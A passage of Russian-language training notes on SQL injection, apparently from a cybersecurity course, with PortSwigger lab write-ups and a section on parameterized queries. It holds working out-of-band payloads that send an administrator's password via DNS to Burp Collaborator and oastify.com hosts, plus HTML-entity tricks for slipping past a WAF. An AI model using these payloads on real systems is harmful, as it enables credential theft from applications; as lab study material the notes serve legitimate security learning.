...
> Базовая линия: OWASP WSTG Latest. Исторические примеры сохранены для разбора, но не являются рекомендацией для реальных систем; практику выполняйте только в назначенной лаборатории внешней учебной платформы и в пределах её правил.
...
###### **Шаг 2: Использование битовых ( #ASCII ) операций вместо substring (3-4 минуты)**

> Пример: [[Учебный курс — кибербезопасность/04 Безопасность приложений/07 SQL и NoSQL/03 Практика SQL injection#Lab: Blind SQL injection with conditional responses|Lab: Blind SQL injection with conditional responses]]
...
###### **Шаг 2 (альтернатива): Использование бинарного поиска (2-3 минуты)** ( #binary_search )
...
## Использование слепой SQL-инъекции с использованием OAST техник

Методы запуска DNS-запроса зависят от типа используемой базы данных. Например, следующий ввод в Microsoft SQL Server может быть использован для создания DNS-поиска на заданном домене:

``` sql
`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`
```

Это заставляет базу данных выполнить поиск по следующему домену: `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

Убедившись в способе запуска OAST взаимодействий, вы можете использовать out-of-band канал для извлечения данных из уязвимого приложения. Например:

```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

Этот ввод считывает пароль пользователя `Administrator`, добавляет уникальный поддомен Collaborator и запускает поиск DNS. Этот поиск позволяет просмотреть захваченный пароль: 
...
## SQL-инъекции в разных контекстах

Вы можете выполнять атаки с помощью SQL-инъекций, используя любой управляемый ввод, который обрабатывается приложением в виде SQL-запроса. Например, некоторые сайты принимают данные в формате JSON или XML и используют их для запроса к базе данных.

Эти разные форматы могут предоставлять разные способы скрытия атак, которые в противном случае заблокированы WAF и другими защитными механизмами. Слабые реализации часто ищут распространённые ключевые слова для SQL-инъекций в запросе, поэтому вы можете обойти эти фильтры, закодировав или убрав символы в запрещённых ключевых словах. Например, следующая XML-инъекция SQL использует последовательность XML-escape для кодирования символа `S` в  `SELECT`: 
...
Он будет декодироваться на серверной стороне перед передачей на интерпретатор SQL.

---

## Как предотвратить инъекцию SQL

Большинство случаев SQL-инъекции можно предотвратить, используя параметризованные запросы (parameterized queries) вместо конкатенации строк внутри запроса. Эти параметризованные запросы также известны как «prepared statements».

Следующий код уязвим для инъекции SQL, поскольку пользовательский ввод конкатенируется напрямую с запросом:
...
Вы можете переписать этот код так, чтобы пользовательский ввод не мешал структуре запроса:
...
Параметризованные запросы можно использовать в любой ситуации, когда недоверенные входные данные появляются в запросе, включая условие `WHERE` и значения в инструкции `INSERT` или `UPDATE`. Их нельзя использовать для обработки недоверенных входных данных в других частях запроса, таких как имена таблиц или столбцов, или в условие `ORDER BY`. Функциональность приложения, которая помещает недоверенные данные в эти части запроса, должна использовать другой подход, например:
1. Включение разрешенных входных значений в белый список.
2. Использование другой логики для обеспечения требуемого поведения.
Чтобы параметризованный запрос был эффективен в предотвращении SQL-инъекций, строка, используемая в запросе, всегда должна быть жестко запрограммированной константой. Она никогда не должна содержать переменные данные любого происхождения.
...
##### Скрипт перевода двоичной ASCII строки в символы (ASCII_to_chars)
...
![[Учебный курс — кибербезопасность/04 Безопасность приложений/07 SQL и NoSQL/03 Практика SQL injection#Скрипт перевода двоичной ASCII строки в символы (ASCII_to_chars)]]
...
[SQL injection - Lab: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-using-out-of-band-oast-techniques/sql-injection/blind/lab-out-of-band)

Берём нагрузку из cheat list'а PortSwigger:
```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

Добавим UNION и закроем комментарием:
```
Cookie: TrackingId=' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```

Осталось вставить Burp Collaborator и закодировать все URL символы в URL (выделить весь запрос и нажать Ctrl+U).
...
Проверяем Out-of-band метод нагрузкой из предыдущей лабы:
``` sql
-- здесть нужно добавить BURP-COLLABORATOR и закодировать всё Ctrl+U
Cookie: TrackingId=' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```

Нагрузка работает. Пробуем получить данные через следующую нагрузку из  cheat list'а PortSwigger. 
1. Добавив UNION и комментарий;
2. Заменив `YOUR-QUERY-HERE` на `'a' FROM dual`:
```sql
-- здесь также нужно заменить "BURP-COLLABORATOR-SUBDOMAIN" и закодировать всё Ctrl+U
UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT 'a' FROM dual)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```

На данном этапе нагрузка работает. Теперь нужно достать пароль администратора.

``` http
Cookie: TrackingId='+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.u2x7ch30g3kmdhl783jg75wh78dz14pt.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

> The Collaborator server received a DNS lookup of type A for the domain name **`al2ada6ibmpdu2tl3smt.u2x7ch30g3kmdhl783jg75wh78dz14pt.oastify.com`**.

---

### Lab: SQL injection with filter bypass via XML encoding

[SQL injection - Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-in-different-contexts/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>1 SELECT NULL;</productId>
		<storeId>1 SELECT NULL;</storeId>
	</stockCheck>
	
-- 403 "Attack detected"
```

Подбираем удачную кодировку и смотрим ответ ([To HTML Entity — CyberChef](https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity\(true,'Named%20entities'\)&input=U0VMRUNUIE5VTEw7&ieol=CRLF&oeol=CR)):
...
Ошибки нет, но стоит собрать список запрещённых слов/символов. Получаем:
1. `'` - "`&apos;`"
2. `--` - "`&#45;&#45;`"
3. `SELECT` - "`&#83;&#69;&#76;&#69;&#67;&#84;`"
4. `UNION` - "`&#85;&#78;&#73;&#79;&#78;`"

Далее в это врайтапе для наглядности самих SQL команд нет перекодирования, его необходимо выполнять самостоятельно.

1. Пробуем получить список таблиц:
	```sql
